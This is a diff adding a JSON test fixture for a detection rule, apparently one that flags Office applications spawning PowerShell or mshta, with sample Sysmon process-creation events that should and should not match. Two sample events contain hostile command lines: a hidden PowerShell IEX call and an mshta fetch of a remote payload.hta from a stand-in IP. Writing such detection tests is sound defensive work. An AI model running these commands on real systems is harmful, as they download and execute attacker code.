@@ -1,0 +1,50 @@
+{
+  "should_match": [
+    {
+      "description": "Word starts PowerShell",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -nop -w hidden -c IEX(...)",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      }
+    },
+    {
+      "description": "Excel starts mshta",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "CommandLine": "mshta.exe http://198.51.100.7/payload.hta",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+      }
+    }
+  ],
+  "should_not_match": [
+    {
+      "description": "Explorer starts cmd (user action)",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe",
+        "ParentImage": "C:\\Windows\\explorer.exe"
+      }
+    },
+    {
+      "description": "Word starts the print spooler helper",
+      "event": {
+        "EventID": 1,
+        "Computer": "WIN-FIN-07",
+        "User": "CORP\\j.doe",
+        "Image": "C:\\Windows\\System32\\splwow64.exe",
+        "CommandLine": "splwow64.exe 12288",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      }
+    }
+  ]
+}
